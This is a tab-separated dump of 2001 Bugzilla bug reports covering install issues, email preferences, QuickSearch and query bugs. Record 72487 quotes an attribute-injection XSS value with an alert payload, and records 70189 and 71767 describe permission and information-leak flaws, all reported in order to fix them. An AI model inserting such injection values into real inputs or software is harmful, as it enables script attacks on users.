68873%TAB%982164173%TAB%15863%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla install doesn't work over NFS,Bugzilla install doesn't work over NFS; mention this in README%TAB%Bugzilla install doesn't work over NFS,Bugzilla install doesn't work over NFS; mention this in READMEWe had a RAID fail on our Sun that powers our intranet site, so our webroot is actually NFS mounted from a FreeBSD 4.1 machine.   The Lock() function  "processmail" script requires flock() to work properly, which may not work completely under NFS. After debugging, it hit me that we were still going over NFS. The symptom is that checksetup.pl will hang on:  Now regenerating the shadow database for all bugs.  This is probably not really a bug, but more of a "user beware", and probably something to mention in the README file. Especially for people installing to machines which rely on network attached storage.
69000%TAB%982276477%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla 3,Bugzilla,Query/Bug List%TAB%Group and system stored queries.,Permit a stored query to be marked "shared" and accessble by URL by other users,Permit a stored query to be marked "shared" and accessble by other users,Permit a stored query to be marked "shared" and accessible by other users%TAB%Group and system stored queries.,Permit a stored query to be marked "shared" and accessble by URL by other users,Permit a stored query to be marked "shared" and accessble by other users,Permit a stored query to be marked "shared" and accessible by other usersYou should be able to define stored queries for systems and groups rather than just users.  This will save space in the database for commonly defined queries.
69054%TAB%982306662%TAB%25465%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Some additions needed to README,DB_File is not portable%TAB%Some additions needed to README,DB_File is not portableI have just installed Bugzilla (actually, the second time, but I did a complete upgrade since the first time was just "for fun".  The collectstats.pl fails because DB_File was not installed.  To install DB_File one also needs BerkeleyDB (which one should have assuming that one has a new version of mySql).    Anyway, those two packets should be added to the optional SW needed notes.
69147%TAB%982331979%TAB%25465%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%reports.cgi still refers to gif (bugzilla 2.11)%TAB%reports.cgi still refers to gif (bugzilla 2.11)The newest Chart package no longer supports gif files.  It has moved (as has gd) to support for png.  The reports.cgi was getting an error at line 534 with 	eval '$testimg->gif()'; changing that line to read	 	eval '$testimg->png()'; resolves the issue.
69269%TAB%982450710%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Misleading reassignment message.%TAB%Misleading reassignment message.When you choose "Reassign bug to owner of selected component" it also reassigns the QA.  This is fine, but if you have QA contacts on, it should say "owner & QA".
69447%TAB%982615605%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Creating/Changing Bugs%TAB%Make CC changes not cause midairs.%TAB%Make CC changes not cause midairs.It would be nice if CC changes didn't cause midairs, similar to the way voting works.
69533%TAB%982668516%TAB%25465%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%enter_bug.cgi does not auto-detect HP-UX as OS%TAB%enter_bug.cgi does not auto-detect HP-UX as OSenter_bug.cgi correctly detects my HP as the platform, however, OS is always set to "other".  In pickos at line 207-208 there is a duplicated line for SunOS:            /Mozilla.*\(.*;.*; SunOS.*\)/   && do {return "SunOS";};            /Mozilla.*\(.*;.*; SunOS.*\)/   && do {return "SunOS";}; If you change the second to read             /Mozilla.*\(.*;.*; HP-UX.*\)/   && do {return "HP-UX";}; or even just add the line, then the OS is correctly detected when the user is on an HP.  Currently the HP-UX version is not detected, that wouldn't be hard to add if needed.
69616%TAB%982694880%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,User Interface%TAB%Edit sanity check?%TAB%Edit sanity check?The footer has this line for priveleged users:  Edit prefs, parameters, sanity check, users, components, groups, keywords  How about splitting sanity check into its own action.  It has nothing to do with editing.
69621%TAB%982699220%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration%TAB%Keyword cache not updated on keyword rename.,Keyword cache not updated on keyword rename/delete.,Keyword cache not updated on keyword rename/delete (remove the keyword cache)%TAB%Keyword cache not updated on keyword rename.,Keyword cache not updated on keyword rename/delete.,Keyword cache not updated on keyword rename/delete (remove the keyword cache)I noticed this morning this from mozilla.org sanitycheck.cgi:  Checking cached keywords   Bug(s) found with incorrect keyword cache: 46700, 47682, 48303, 50670, 50810, 50875, 51067, 51316, 51574, 51748, 51768, 52134, 52141, 52451, 52457, 52527, 52528, 52530, 52558, 52654, 52887, 52971, 53085, 53087, 53482, 54327, 54328, 55091, 55502, 55667, 56114, 56218, 56379, 56568, 57676, 58951, 58954, 59122, 59480, 59613, 59928, 59964, 61830, 63764, 64139, 64151, 65076, 8388607   At least the first one, probably most of these were due to a keyword rename.  It turns out editkeywords.cgi does not update the version cache of bugs when it renames a keyword.  As far as I can tell, show_bug doesn't use the version cache, so it's not terrible, but I presume queries use it.  I'm still looking at the last, illegal bug number.
69629%TAB%982705000%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Corruption on keywords table.%TAB%Corruption on keywords table.I noticed this morning this from mozilla.org sanitycheck.cgi:  Checking cached keywords   Bug(s) found with incorrect keyword cache: 46700, 47682, 48303, 50670, 50810, 50875, 51067, 51316, 51574, 51748, 51768, 52134, 52141, 52451, 52457, 52527, 52528, 52530, 52558, 52654, 52887, 52971, 53085, 53087, 53482, 54327, 54328, 55091, 55502, 55667, 56114, 56218, 56379, 56568, 57676, 58951, 58954, 59122, 59480, 59613, 59928, 59964, 61830, 63764, 64139, 64151, 65076, 8388607  Now most of this is covered at bug #69621, except the last number, "8388607".  In this case, the bug of course does not exist, yet there is an entry on the keywords table for it.  I do not yet know why, but we need to investigate this and figure out what causes it.  It had the "nsbeta2" and "testcase" keywords on it.  A search of the database on "8388607" brings bug #46741, which might be the cause, as well as bug #9940, which has Terry saying this is the last bug number that you can allocate.  This indicates this number is probably being automatically generated rather than entered by someone as a random number.
69631%TAB%982710547%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Documentation fixes.%TAB%Documentation fixes.Section 4 and 5 of the README are out of date.
69654%TAB%982735581%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla 3,Bugzilla,User Interface%TAB%Bugzilla should have better support for CSS,use CSS to style banner, header, and message,use CSS to style message,use CSS to style informational message at bottom of banner%TAB%Bugzilla should have better support for CSS,use CSS to style banner, header, and message,use CSS to style message,use CSS to style informational message at bottom of bannerAs time passes I've been noticing more and more bugs where people are requestion that one thing or another should have color of some sort associated with it.  It seems to be that the best/easiest way to do this would be to hack in some support for CSS.  We could then either have a "bugzilla stylesheet" or (probably better) allow users to specify their own style sheet.
69670%TAB%982740471%TAB%25465%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl can't check for Chart::Base version%TAB%checksetup.pl can't check for Chart::Base versionbugzilla 2.11, last cvs updat 2001-02-21. checksetup.pl attempts to check the version of Chart::Base, but since the version checking mechanism uses an int, the best it can do is find that version 0.99 is installed, since that is what even version 0.99c claims.  The script then advises the user to obtain 0.99b, which is wrong according to the README and when one attempts to use the older version (gd no longer supports gifs).
69688%TAB%982756686%TAB%15478%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%buglist.cgi: the intermediate "please stand by" page is ugly%TAB%buglist.cgi: the intermediate "please stand by" page is uglyTo reproduce, go to the above URL. The page lacks a <title> (Mozilla keeps the "Bugzilla query page" title from which you usually come from) and the text could be bigger.  Patch is on the way ... :)
69793%TAB%982823483%TAB%13272%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%check in new files for QuickSearch%TAB%check in new files for QuickSearchThis bug is a request to add the QuickSearch tool to the bugzilla cvs repository. It is complementary to bug 61561 which is a request to integrate this tool into the bugzilla front page on bugzilla.mozilla.org .  Description of the tool: ======================== The QuickSearch tool is an alternative query tool for bugzilla. The UI is as simple as possible: a single text box. And it should be simple to use for newbies: you can just enter some words and press return, and it will give you a list of bugs. Currently, this is a JS-based client-side tool, but it could be ported to perl in the future.  Reasons for including it into CVS: ================================== The tool can be useful for all bugzilla installations. All mozilla-specific values are defined in a separate file (currently called "localconfig.js"), so it should be easy to use it in other installations. It works fine for me so far, and I already prefer it over query.cgi more than 80 percent of the time. I consider it production level quality. Checking it in will hopefully increase the chance that someone finds it useful and starts hacking on it.  Files involved: =============== quicksearch.html     (query form with first part of the documentation) quicksearchhack.html (extended query form with second part of the documentation) quicksearch.js       (main part of the JS sources) localconfig.js       (installation-specific values) optional: index.html (for integration into the front page)  I'm going to attach the files soon.
69879%TAB%982853133%TAB%25834%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%[2.11 CVS] No check on the "assign to" user when creating a new bug ,[2.11 CVS] No check on the "assign to" user when creating a new bug%TAB%[2.11 CVS] No check on the "assign to" user when creating a new bug ,[2.11 CVS] No check on the "assign to" user when creating a new bugThis causes a "user_id" of zero in the bugs table.  This of couse presents a  problem within the system.
70039%TAB%982945813%TAB%1214%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Mid-air collision unnecessary if comments only are colliding,Mid-air collision page confusing, users think comments will be lost%TAB%Mid-air collision unnecessary if comments only are colliding,Mid-air collision page confusing, users think comments will be lostIn any event, the warning is unclear to many, many people (paraphrasing: "this will cause all changes to be lost, except for changes to the long description" -- what's the "long description"?).  But if bugzilla can figure out that only comments are colliding, there is no data loss, and no need for user intervention.  The comments should be added, in whatever order makes sense (server post reception time order, probably).  This is an easy change, I hope; it shouldn't wait for a 3.0 rewrite.  People right now are wasting time going Back and copying and pasting their comments (which is fraught with peril, given C&P bugs; in fact, Mozilla doesn't alway restore saved textarea data, making for even more unnecessary real data loss, all to avoid bogus data non-loss that bugzilla makes users fret about).
70189%TAB%983165679%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General,attachment and request management%TAB%showattachment.cgi doesn't check viewing permissions%TAB%showattachment.cgi doesn't check viewing permissionsOne of the reasons listed for having bug security is the possibility that proprietary code could be associated w/that bug.  There's a good chance that this code could be in an attachment.  showattachment.cgi should thus check the viewing permissions on a bug before spitting out the data.  If the idea I listed in bug 39816 is used, this would be fixed by changing the SQL query to:  select mimetype, bug_id, thedata from attachments where attach_id =" . SqlQuote($::FORM{'attach_id'})  Then adding something along the lines of: if (!UserCanSeeBug($row[1]) {     # Error message about not being able to view the attachment here }  And, of course, changing the print line to:  print qq{Content-type: $row[0]\n\n$row[2]};
70544%TAB%983382504%TAB%13272%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%QuickSearch drops everything after the first negated word%TAB%QuickSearch drops everything after the first negated wordDoh. So when I fixed treatment of negation to support the generic notation (-field1,...,fieldN:value1,...,valueM), I started using the "and" counter. I correctly increase it for each generated clause, but I forgot to reset it for each new "chart". So everything works fine up to (and including) the first negated word, but everything else is ignored because the chart-and-or expressions start with X-Y-0 instead of X-0-0.  This is a one-liner. Would be nice if this made it into the release.
70710%TAB%983530265%TAB%25075%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Email%TAB%More expandable tags within emails,Make the Bug object available to newchangedmail substitutions,More expandable tags within emails%TAB%More expandable tags within emails,Make the Bug object available to newchangedmail substitutions,More expandable tags within emailsI receive bugzilla emails for several bugzilla projects. I would like to folder them automatically in my mailtool.  Therefore, it would be nice to include the projectname in the emails subject. I  propose to add the new tag %project% so that it can be used within the mail  params. E.g. One may specify the subject line like this:  Subject: [Bug %bugid%] [Project: %project] %neworchanged% - %summary%  A more general approach would be to include all fields from the bug form as  tags.  Therewith, the email content could be tailorized according to individual 
70907%TAB%983772582%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%QuickSearch: port the JS code to perl (make it server-side)%TAB%QuickSearch: port the JS code to perl (make it server-side)Currently QuickSearch is a client-site JavaScript-based tool. Porting it to perl and turning it into a server-side tool would have two benefits: - it could be used with JS turned off - a bookmarklet could be created to provide QuickSearch functionality - the ugly hack with the hardcoded keywords could be removed  It would make development a little harder because you'd have to change the server, or setup your own, each time you want to test a little change, but I think it's worth it.
71396%TAB%984075341%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%$::db->do isn't needed anymore%TAB%$::db->do isn't needed anymoreAt the time that these lines were added ('round about line 601 of editproducts.cgi) there was no real way to do an SQL call while another was in process.  Since then, Dan added a PushSQLState and PopSQLState (or something like that).  Adding those would allow the $::db->do lines to be replaced w/SendSQL().
71503%TAB%984142997%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Loads of javascript warnings in quicksearch.js%TAB%Loads of javascript warnings in quicksearch.jsIf you turn on strict JS checking in Mozilla using (user_pref("javascript.options.strict", true); then quicksearch.js produces a whole lot of warnings.  Gerv
71510%TAB%984144832%TAB%9911%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Need correct permissions on new graphs dir%TAB%Need correct permissions on new graphs dirAlthough I know my popularity among those trying to release 2.12 is fast  plummetting, I am nominating this, on the basis that the one person I know who  tried to upgrade to the tip hit it, and it's not documented, nor are the  symptoms of the problem obvious.  The --CHMOD-- section of checksetup.pl needs to make the new "graphs" directory  (created in the "updating installations" section) writeable by the webserver  user. Or, the code which creates the directory needs to do it. I tried to work  out how to do this, but couldn't.
71550%TAB%984180924%TAB%13272%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Watching is broken if watched user has set "Do not email me bugs that I change" (which is the default)%TAB%Watching is broken if watched user has set "Do not email me bugs that I change" (which is the default)OK, I see what's going on here.  The code that checks for watchers is inside NewProcessOnePerson().  However, much of the filtering happens in filterEmailGroup(), and NewProcessOnePerson() never gets called for users that are filtered out there.  A possible fix is to move the watcher code from NewProcessOnePerson() to filterEmailGroup().  This would make a watcher see all potential notifications of a watchee subject to the watcher's emailflags (rather than the watchee's emailflags, which is currently what happens).    It's conceivable that this proposed fix might break when oldemailtech is involved, but it might not.
71552%TAB%984182373%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Remove oldemailtech from Bugzilla%TAB%Remove oldemailtech from BugzillaMaking this a 2.14.  It's not exactly security, but bugzilla.mozilla.org can't  easily cvs update again until this is yanked.  Regenerating the shadow directory  (the ASCII copies of all the bugs in ${BUGZILLA_HOME}/shadow that oldemailtech  uses to make the diffs it mails out) on running checksetup.pl takes approximately  7 hours to run on b.m.o with 71000 bugs.
71555%TAB%984184975%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl should set chmod permissions without $webservergroup%TAB%checksetup.pl should set chmod permissions without $webservergroupCurrently, checksetup.pl does absolutely nothing to your file permissions if you  aren't using $webservergroup.  It should be making everything world readable/executable in this situation, since  that probably means you're running it in a personal webspace (http://site.com/~user/bugzilla or the like) and don't have access to set the  files to the group of the web server.
71574%TAB%984224809%TAB%21544%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%"My Bugs" in Bugzilla looks wrong%TAB%"My Bugs" in Bugzilla looks wrongAfter the upgrade the "My Bugs" field at the bottom of the site is too large. This is very annoying when you have that field turned on in the prefs.  By "too large" do you mean because it's there all by itself?  That space can fill  up if you have a lot of saved queries that you have available in your footer,  because those go in the same spot.
71600%TAB%984271975%TAB%9911%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Email prefs are broken.%TAB%Email prefs are broken.Andreas added a comment and CCed himself on the above bug; I did not get bug  mail (and he was told so at the time.) I have turned off CC notification in my  bug preferences for when I am the reporter, but not comment notification.  I suspect that, at the moment, it seems that you don't get email if you are  uninterested in _any_ of the things which happened. The correct logic is for you  not to get mail only if you are uninterested in _all_ of the things which  happened.  I think we should consider posting to n.p.m.announce telling people not to use  the email prefs until we've resolved this - people may be losing important mail.
71607%TAB%984282525%TAB%1749%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Displays time in several different formats at the same time%TAB%Displays time in several different formats at the same timeWhen doing a search with a date column on I notice that the date formats are in (at least) three completely different formats. It's the normal (ISO) YYYY-MM-DD, but also a MM-DD or if it is DD-MM and one english textual date weekday HH:MM.   It get's confusing to have them all mixed up and in the case of "03-02" I don't know it's 2 March or 3 February (or is it maybe the time slightly malformed, 03:02 today?).  I would suggest to use the same format for all posts and if you really want to demonstrate cool technology making it a pref so that people can turn it on on will. For most uses, this will be a usability problem since you have to spend extra time parsing the date all the time because you don't know (your brain doesn't) how to read the date until you have read it, i.e. to use computer language you have to make two passes over it instead of one.
71625%TAB%984302046%TAB%422%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Getting oldemailtech notifications%TAB%Getting oldemailtech notificationsWhen hwaara@chello.se added himself to the CC list on 71623, I got an old-style bugmail notification.  According to the database, I have newemailtech turned on, and so does hwaara@chello.se.  My email flags are:  ExcludeSelf~on~emailOwnerRemoveme~on~emailOwnerComments~on~emailOwnerAttachments~on~emailOwnerStatus~on~emailOwnerResolved~on~emailOwnerKeywords~~emailOwnerCC~~emailOwnerOther~on~emailReporterRemoveme~on~emailReporterComments~on~emailReporterAttachments~on~emailReporterStatus~on~emailReporterResolved~on~emailReporterKeywords~on~emailReporterCC~~emailReporterOther~on~emailQAcontactRemoveme~on~emailQAcontactComments~on~emailQAcontactAttachments~on~emailQAcontactStatus~on~emailQAcontactResolved~~emailQAcontactKeywords~on~emailQAcontactCC~~emailQAcontactOther~on~emailCClistRemoveme~~emailCClistComments~on~emailCClistAttachments~on~emailCClistStatus~on~emailCClistResolved~on~emailCClistKeywords~~emailCClistCC~~emailCClistOther~  Håkan's are:  ExcludeSelf~on~emailOwnerRemoveme~on~emailOwnerComments~on~emailOwnerAttachments~on~emailOwnerStatus~on~emailOwnerResolved~on~emailOwnerKeywords~on~emailOwnerCC~~emailOwnerOther~on~emailReporterRemoveme~on~emailReporterComments~on~emailReporterAttachments~on~emailReporterStatus~on~emailReporterResolved~on~emailReporterKeywords~on~emailReporterCC~~emailReporterOther~on~emailQAcontactRemoveme~on~emailQAcontactComments~on~emailQAcontactAttachments~on~emailQAcontactStatus~on~emailQAcontactResolved~on~emailQAcontactKeywords~on~emailQAcontactCC~~emailQAcontactOther~on~emailCClistRemoveme~on~emailCClistComments~on~emailCClistAttachments~on~emailCClistStatus~~emailCClistResolved~on~emailCClistKeywords~~emailCClistCC~~emailCClistOther~  Help?
71658%TAB%984341261%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Attached patches should appear as (text/plain; patch)%TAB%Attached patches should appear as (text/plain; patch)Because right now they appear as (text/plain) which makes them indistiguishable  from other text files.  Bugzilla does keep track of whether it's a patch or not  (it's a separate radio button when you're uploading the attachment), so why not  display it?  True, I didn't notice that. But in createattachment.cgi it says "text/plain, diffs", we should use the same wording in each place (but I'm not sure which one is better).  The initial comment is a bit terse :) - that's why I was asking.
71659%TAB%984341659%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%New bugs do not create email if the reporter doesn't comment%TAB%New bugs do not create email if the reporter doesn't commentwhen i report bugs that include detailed comments, they're often marked as  invalid RFEs even though that is technically illegal.  It's much better for me  to write an empty bug and have someone ask for clarification than for me to  write a bug which is long and then deemed invalid. In general someone else is  much better able to describe what I want than I am [check my posting history].
71767%TAB%984410077%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Provide summary view for secure bugs%TAB%Provide summary view for secure bugsThe addition of the bug summary to the page <title> and the tooltips of bug links initially had the unwanted side-effect of leaking this information for secure bugs.  The "quick fix" was to not show the summary if the bug is secure, regardless of the user's permissions.  Effected files: show_bug.cgi (v1.14), duplicates.cgi (v1.4), globals.pl (v1.85)  This should be fixed for 2.14 to allow users with proper permissions to benefit from this information.
71793%TAB%984427415%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,User Interface%TAB%Make email preferences more compact%TAB%Make email preferences more compactI think the email preferences would be easier to read and easier to use if the  checkboxes were in a grid.  I'll attach an HTML mockup shortly.
71794%TAB%984428420%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Email%TAB%processmail shouldn't bother checking dependencies unless state changes.%TAB%processmail shouldn't bother checking dependencies unless state changes.I believe mail is not sent to any dependent bugs unless the bug being changed has  a state change.  Bearing this in mind, processmail should not even bother with  the "Checking dependencies for changes" bit unless the change being made is  worthy of notifying the dependent bugs anyway.  Right now you get a box on the  "Processed Bug" screen for each dependent bug telling you it didn't send any  mail.  What's the point?  :-)
71798%TAB%984430924%TAB%23239%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%bugmail not sent when moving from cc to assigned fields%TAB%bugmail not sent when moving from cc to assigned fieldstimeless reassigned to me, added ducarroz to cc, and commented on the referenced bug, and I didn't get any bugmail.  My prefs are basically set to only ignore cc-only changes, so I should have gotten mail.  per timeless, cgi feedback was: <timeless>  Email sent to: ducarroz@netscape.com, blakeross@telocity.com,             timeless@mac.com, disttsc@bart.nl <timeless>  Excluding: maolson@earthlink.net, matt@nightrealms.com,             sairuh@netscape.com
71808%TAB%984454844%TAB%14006%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Can't set email preferences for voted bugs.%TAB%Can't set email preferences for voted bugs.You can only set email preferences for owned, reported, QA or CC's bugs.  What happens to voted bugs?
71818%TAB%984465783%TAB%22599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Notification prefs (cc changes for cced bugs) don't work%TAB%Notification prefs (cc changes for cced bugs) don't workReproduction: 1. Change your prefs not to get mail for cc field changes for bug you are cced on. 2. Make such a change on auch a bug.  Actual result: Do do get mail for the change.  Expected result: No mail.
71840%TAB%984478440%TAB%4054%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface%TAB%[RFE] Make comments referencable,[RFE] Make comments referenceable%TAB%[RFE] Make comments referencable,[RFE] Make comments referenceableComments cannot be referenced individually. It would be great if they could.  Here is a proposed patch (the line which changes is the one with lots of "---"  on it. I add a <A NAME=""> bit).  http://www.hixie.ch/bugzilla/ is currently running with this change.   ***** globals.pl before *****      $query .= "ORDER BY longdescs.bug_when";     SendSQL($query);     while (MoreSQLData()) {         my ($who, $email, $when, $text) = (FetchSQLData());         $email .= Param('emailsuffix');         if ($count) {             $result .= "<BR><BR><I>------- Additional Comments From ";               if ($who) {                   $result .= qq{<A HREF="mailto:$email">$who</A> } .                       time2str("%Y-%m-%d %H:%M", str2time($when)) .                           " -------</I><BR>\n";               } else {                   $result .= qq{<A HREF="mailto:$email">$email</A> } .                       time2str("%Y-%m-%d %H:%M", str2time($when)) .                           " -------</I><BR>\n";               }         }         $result .= "<PRE>" . quoteUrls(\%knownattachments, $text) . "</PRE>\n";         $count++;     }   ***** globals.pl after *****      $query .= "ORDER BY longdescs.bug_when";     SendSQL($query);     while (MoreSQLData()) {         my ($who, $email, $when, $text) = (FetchSQLData());         $email .= Param('emailsuffix');         if ($count) {             $result .= "<BR><BR><I>------- <A NAME='$count'>Additional Comments  From</A> ";               if ($who) {                   $result .= qq{<A HREF="mailto:$email">$who</A> } .                       time2str("%Y-%m-%d %H:%M", str2time($when)) .                           " -------</I><BR>\n";               } else {                   $result .= qq{<A HREF="mailto:$email">$email</A> } .                       time2str("%Y-%m-%d %H:%M", str2time($when)) .                           " -------</I><BR>\n";               }         }         $result .= "<PRE>" . quoteUrls(\%knownattachments, $text) . "</PRE>\n";         $count++;     }
71912%TAB%984511043%TAB%1689%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Mail notification prefs for CC's are wrong-headed,add email pref "if I'm added to that capacity"%TAB%Mail notification prefs for CC's are wrong-headed,add email pref "if I'm added to that capacity"I like the flexibility of the new bugzilla mail prefs--kudos to all--but I  think the "CC" option missed the boat.  In part e-mail notifications are a convenience, an "event" if you will, but in  large part they are there so we can keep an eye out for damage to the bug data  (whether well-meaning or malicious). I don't give a hoot if Joe CC's himself or  removes himself, but I do care if  1) someone CC's me on a bug -- it means they think I should look at it  2) someone removes my CC from a bug -- why the f*** did they do that?  3) someone adds or removes non-self CC's on bugs I'm otherwise watching -- keep  an eye out for potential mischief.  There are too many Joes, so I and most everyone will turn off the CC  notifications. This means that in case 1) I may not see the bug for a while,  not until the next update. This will in turn result in some folks  figuring this out and so adding a comment at the same time they CC me,  defeating the purpose for folks who turn off the CC field. In the second case I  may simply never know, and will thus miss whatever I was watching for. And in  the third case I'll not notice that someone is munging my bugs.  I think this needs re-thinking a bit.
72177%TAB%984708613%TAB%15478%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Email%TAB%email filtering consistency%TAB%email filtering consistencyAs much as I appreciate the new email filtering options, I think they should be consistent to avoid confusion, i.e. a checked box should always mean the same, e.g. "send me mail" or "don't send me mail".  The first option is labeled "Do not email me bugs that I change" (negative) while all the other ones are labeled "email me when ..." (positive).  So I suggest reversing the first checkbox to read "Email me bugs that I change".  This way I could see by a quick glance whether I have any filtering options active (anything not checked) or not.
72184%TAB%984718114%TAB%4432%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Creating/Changing Bugs%TAB%BugZilla fails to create large attachments...,Check for SQL size limit before inserting comment into database%TAB%BugZilla fails to create large attachments...,Check for SQL size limit before inserting comment into databaseYes, this was an accident - I quoted the full response from BugZilla (which was too large, too - seems that form submission in general has problems with large incoming forms, not only a problem of the attachment CGI). Maybe we should rename this bug to "BugZilla creates Bug entries for _failed_ submissions"... !?
72379%TAB%984870217%TAB%6303%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%query.cgi?component= is not SELECTEDing the option,query.cgi component value does not reload form SELECTED item%TAB%query.cgi?component= is not SELECTEDing the option,query.cgi component value does not reload form SELECTED itemOverview:  A bugzilla query.cgi URL including a value for the Component form control will generate a query page that *does not* have the SELECTED attibute on  any of the <OPTION>s of the <SELECT> NAMEd "compoenent". This mean that the resulting buglist will unexpectedly not be limited to matches to the  selected component.  Corresponding buglist.cgi URLs, including remembered queries, work as expected.  Steps to reproduce: 1. Click on the URL link above.  2. Observe the form. The FIXED resolution, the Webtools product,     and the Bonsai component should be SELECTED. 3. Click on Bonsai to select it. 4. Submit the form. 5. At the bottom of the buglist, click on the _Edit this query_ link. 6. Observe the form again. 7. Click the browser's [Back] button twice. 8. Observe the form again.  Expected Results: A. In steps 2, 6, and 8, the Component <SELECT> should have the "Bonsai"    <OPTION> SELECTED. B. If step 3 is left out, the buglist should contain only Bonsia bugs.  Actual Results: A. In steps 2, 6, and 8, the Component <SELECT> *does not* have the "Bonsai"    (or any) <OPTION> SELECTED. B. If step 3 is left out, the buglist will contain bugs from all Webtools    components.  Tested with: * Both bugzilla.mozilla.org and landfill.tequilarista.org * NN4.76, current Mozilla, and IE5.5 * Other Product/Component pairs Same results on each trial.  Additional Information: This is a regression. It can cause a reasonably tightly crafted query.cgi URL stored as a bookmark or a link on a webpage to end up requesting a HUGE buglist if the user doesn't manually fix up the form before submitting it.  At the bottom of  http://www.mozilla.org/quality/help/screening-duplicates.html there is a set of links to generate buglists for Browser-General bugs  submitted in the last week for all platforms, Linux-only, Mac-only,  and a final link called /Customize/ that is the same query as a query.cgi, so the user can, for instance, change the date range or put something in the Summary textbox. Right now, if the [Submit query] button is clicked, the buglist will contain *all* Browser product bugs submitted in the last week. Needless to say, before screening-duplicates.html went live all those links were tested and the buglist was limited to "Browser-General" as intended.
72487%TAB%984990455%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General,attachment and request management%TAB%Create Attachment should allow user to create another attachment%TAB%Create Attachment should allow user to create another attachmenta user's description could be: " onmouseover="alert('i am silly')" but the only person who would be affected by that is the person who made the  attachment.  Seeking new r=.  patch features: adds link and title for newly created attachment and adds  create another attachment following table.
72721%TAB%985099161%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%duplicates.cgi performs poorly with lots of bugs%TAB%duplicates.cgi performs poorly with lots of bugsOn bugzilla.mozilla.org, duplicates.cgi sorts all 7000 dupes in a hash prior to display, which takes an unacceptably long time. I've made it so that it first weeds out all bugs with a dup_count below a certain value, which is a param.   I've also added "Click to sort" column headings, refactored the code a bit and generally tidied it up. This should hopefully make duplicates.cgi "2.12-ready", but it'll need testing on there, as I can't test it with a DB that big.   There's still no easy interface to changing the time difference for the "changed since" column, but that can wait. Suggestions as to how to do this are welcome.  Patch to follow.
